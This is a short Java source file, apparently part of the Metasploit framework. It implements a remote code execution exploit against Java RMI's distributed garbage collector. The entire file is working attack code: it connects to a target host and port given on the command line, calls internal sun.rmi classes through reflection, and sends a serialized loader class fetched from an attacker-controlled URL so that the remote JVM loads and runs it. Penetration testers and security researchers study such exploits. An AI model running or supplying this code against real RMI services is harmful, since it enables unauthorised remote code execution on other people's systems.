package rmi;

import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.server.ObjID;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;

import sun.rmi.server.UnicastRef2;
import sun.rmi.transport.DGCImpl_Stub;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

public class RMISender {
	
	public static void main(String[] args) throws Exception {
		Endpoint endpoint = new TCPEndpoint(args[1], Integer.parseInt(args[2]));
		URLClassLoader ucl = new URLClassLoader(new URL[] {new URL(args[0])});
		Object loader = ucl.loadClass("metasploit.RMILoader").newInstance();	
		UnicastRef2 ref = new UnicastRef2(new LiveRef(new ObjID(ObjID.DGC_ID), endpoint, false));
		DGCImpl_Stub stub = new DGCImpl_Stub(ref);
		Field f = stub.getClass().getDeclaredField("operations");;
		f.setAccessible(true);
		RemoteCall remotecall = ref.newCall(stub, (Operation[])f.get(stub), 0, 0xf6b6898d8bf28643L);
		ObjectOutput objectoutput = remotecall.getOutputStream();
		objectoutput.writeObject(new ObjID[0]);
		objectoutput.writeLong(0);
		objectoutput.writeObject(loader);
		objectoutput.writeBoolean(false);
		ref.invoke(remotecall);
		ref.done(remotecall);	
	}
}
